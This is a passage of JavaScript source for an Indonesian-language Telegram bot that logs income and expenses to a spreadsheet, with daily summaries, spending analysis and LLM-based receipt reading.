      const inputYear = Number(parts[3]);

      if (
        !Number.isInteger(inputDay) ||
        !Number.isInteger(inputMonth) ||
        !Number.isInteger(inputYear) ||
        inputDay < 1 ||
        inputDay > 31 ||
        inputMonth < 1 ||
        inputMonth > 12 ||
        inputYear < 2000
      ) {
        return ctx.reply('Format salah.\nContoh:\n/hari\n/hari 5 6 2026');
      }

      day = inputDay;
      month = inputMonth;
      year = inputYear;
    }

    const summary = await getDailySummary(day, month, year);

    const dateLabel = new Date(year, month - 1, day).toLocaleDateString('id-ID', {
      weekday: 'long',
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    });

    if (summary.items.length === 0) {
      return ctx.reply(`Tidak ada transaksi untuk ${dateLabel}.`);
    }

    const pemasukanItems = summary.items.filter(item => item.pemasukan > 0);
    const pengeluaranItems = summary.items.filter(item => item.pengeluaran > 0);

    const lines = [];
    lines.push(`Rekap harian ${dateLabel}`);
    lines.push('');

    lines.push('Pemasukan');
    if (pemasukanItems.length > 0) {
      for (const item of pemasukanItems) {
        lines.push(`${item.kategori} | ${formatRupiah(item.pemasukan)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push('Pengeluaran');
    if (pengeluaranItems.length > 0) {
      for (const item of pengeluaranItems) {
        const toko = item.toko ? ` (${item.toko})` : '';
        lines.push(`${item.kategori}${toko} | ${formatRupiah(item.pengeluaran)}`);
      }
    } else {
      lines.push('-');
    }

    lines.push('');
    lines.push(`Total Pemasukan: ${formatRupiah(summary.totalPemasukan)}`);
    lines.push(`Total Pengeluaran: ${formatRupiah(summary.totalPengeluaran)}`);
    lines.push(`Saldo: ${formatRupiah(summary.saldo)}`);

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal mengambil rekap harian.', err);
    return ctx.reply('Gagal mengambil rekap harian.');
  }
});

bot.command('analisa', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    await ctx.reply('Menyusun analisa...');

    const analisa = await updateAnalisaSheet();

    const lines = [];
    lines.push('Analisa Keuangan 📊');
    lines.push('');
    lines.push(`Total Pemasukan: ${formatRupiah(analisa.totalPemasukan)}`);
    lines.push(`Total Pengeluaran: ${formatRupiah(analisa.totalPengeluaran)}`);
    lines.push(`Saldo: ${formatRupiah(analisa.saldo)}`);
    lines.push(`Jumlah Transaksi: ${analisa.jumlahTransaksi}`);

    if (analisa.perKategori.length > 0) {
      lines.push('');
      lines.push('Top Pengeluaran per Kategori:');
      for (const [kategori, jumlah] of analisa.perKategori.slice(0, 5)) {
        lines.push(`- ${kategori}: ${formatRupiah(jumlah)}`);
      }
    }

    if (analisa.perToko.length > 0) {
      lines.push('');
      lines.push('Top Pengeluaran per Toko:');
      for (const [toko, jumlah] of analisa.perToko.slice(0, 5)) {
        lines.push(`- ${toko}: ${formatRupiah(jumlah)}`);
      }
    }

    lines.push('');
    lines.push(`Detail lengkap ada di sheet "${getAnalisaSheetName()}".`);

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal membuat analisa.', err);
    return ctx.reply('Gagal membuat analisa.');
  }
});

bot.on(['photo', 'document'], async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    if (!isLlmConfigured()) {
      return ctx.reply(
        'Fitur baca struk belum aktif. Isi API key LLM di rekap.json ' +
        '(anthropicApiKey untuk Claude, atau openaiApiKey untuk LLM lain).'
      );
    }

    let fileId = null;
    let mediaType = 'image/jpeg';

    if (ctx.message.photo && ctx.message.photo.length > 0) {
      const photo = ctx.message.photo[ctx.message.photo.length - 1];
      fileId = photo.file_id;
      mediaType = 'image/jpeg';
    } else if (ctx.message.document) {
      const doc = ctx.message.document;
      const mime = doc.mime_type || '';
      if (!mime.startsWith('image/')) {
        return ctx.reply('Kirim foto struk (format gambar) ya.');
      }
      fileId = doc.file_id;
      mediaType = mime;
    }

    if (!fileId) {
      return ctx.reply('Tidak ada gambar yang bisa dibaca.');
    }

    await ctx.reply('Membaca struk... 🧾');

    const link = await ctx.telegram.getFileLink(fileId);
    const res = await fetch(link.href);
    if (!res.ok) {
      throw new Error('Gagal mengunduh gambar dari Telegram');
    }
    const buffer = Buffer.from(await res.arrayBuffer());
    const base64Data = buffer.toString('base64');

    const parsed = await parseReceiptImage(base64Data, mediaType);

    if (!parsed || !parsed.is_receipt) {
      return ctx.reply('Gambar ini sepertinya bukan struk. Coba foto yang lebih jelas.');
    }

    const total = Number(parsed.total);
    if (!total || total <= 0) {
      return ctx.reply('Total pada struk tidak terbaca. Coba foto yang lebih jelas.');
    }

    await ensureHeader();

    let tanggal;
    const parsedDate = parseDateParts(parsed.tanggal || '');
    if (parsedDate) {
      tanggal = `${parsedDate.day}/${parsedDate.month}/${parsedDate.year}`;
    } else {
      tanggal = new Date().toLocaleDateString('id-ID', { timeZone: getTimezone() });
    }

    const kategori = (parsed.kategori || 'Belanja').trim() || 'Belanja';
    const toko = (parsed.toko || '').trim();
    const pengeluaran = 'Rp' + Math.round(total).toLocaleString('id-ID');

    await appendRow([tanggal, kategori, toko, '', pengeluaran]);
    await formatSheetLayout();
    await updateAnalisaSheet();

    const lines = [];
    lines.push('Struk tersimpan ✅');
    lines.push(`Tanggal: ${tanggal}`);
    lines.push(`Kategori: ${kategori}`);
    if (toko) lines.push(`Toko: ${toko}`);
    lines.push(`Total: ${pengeluaran}`);

    if (Array.isArray(parsed.items) && parsed.items.length > 0) {
      lines.push('');
      lines.push('Rincian:');
      for (const item of parsed.items.slice(0, 20)) {
        const harga = Number(item.harga) || 0;
        lines.push(`- ${item.nama}: Rp${Math.round(harga).toLocaleString('id-ID')}`);
      }
    }

    return ctx.reply(lines.join('\n'));
  } catch (err) {
    logError('Gagal membaca struk.', err);
    return ctx.reply('Gagal membaca struk. Coba lagi atau foto lebih jelas.');
  }
});

bot.on('text', async (ctx) => {
  try {
    if (!(await guardOwner(ctx))) return;

    const text = ctx.message.text.trim();

    if (text.startsWith('/')) return;

    const lines = text
      .split(/\r?\n/)
      .map(line => line.trim())
      .filter(Boolean);

    if (lines.length === 0) {
      return ctx.reply('Pesan kosong.');
    }

    await ensureHeader();

    const successLines = [];
    const failedLines = [];

    for (const line of lines) {
      const parsed = await parseTransaction(line);

      if (!parsed) {
        failedLines.push(line);
        continue;
      }

      const now = new Date();
      const pemasukan = parsed.type === 'pemasukan' ? parsed.amountText : '';
      const pengeluaran = parsed.type === 'pengeluaran' ? parsed.amountText : '';
      const toko = parsed.toko || '';

      await appendRow([
        now.toLocaleDateString('id-ID', { timeZone: getTimezone() }),
        parsed.category,
        toko,
        pemasukan,
        pengeluaran,
      ]);

      const tokoLabel = toko ? ` | toko: ${toko}` : '';
      successLines.push(
        `${parsed.type} | ${parsed.category}${tokoLabel} | ${parsed.amountText}`
      );
    }

    await formatSheetLayout();

    if (successLines.length > 0) {
      try {
        await updateAnalisaSheet();
      } catch (analisaErr) {
        logError('Gagal memperbarui sheet analisa.', analisaErr);
      }
    }

    let reply = '';

    if (successLines.length > 0) {
      reply += 'Tersimpan ✅\n' + successLines.join('\n');
    }

    if (failedLines.length > 0) {
      if (reply) reply += '\n\n';
      reply +=
        'Baris gagal dibaca:\n' +
        failedLines.map(line => `- ${line}`).join('\n');
    }

    if (!reply) {
      reply =
        'Format tidak terbaca.\n' +
        'Contoh:\n' +
        '- masuk airdrop 1,5 jt\n' +
        '- masuk 1,5 jt airdrop\n' +
        '- keluar rokok 29k\n' +
        '- keluar 29k rokok\n' +
        '- masuk airdrop 20 usdt\n' +
        '- masuk 20 usdt airdrop\n' +
        '- masuk $10 freelance\n' +
        '- keluar wifi 150000';
    }

    return ctx.reply(reply);
  } catch (err) {
    logError('Gagal simpan ke spreadsheet.', err);
    return ctx.reply('Gagal simpan ke spreadsheet.');
  }
});

bot.catch((err) => {
  logError('BOT ERROR:', err);
});

logInfo('Started bot...');

bot.launch().catch((err) => {
  logError('Launch error:', err);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
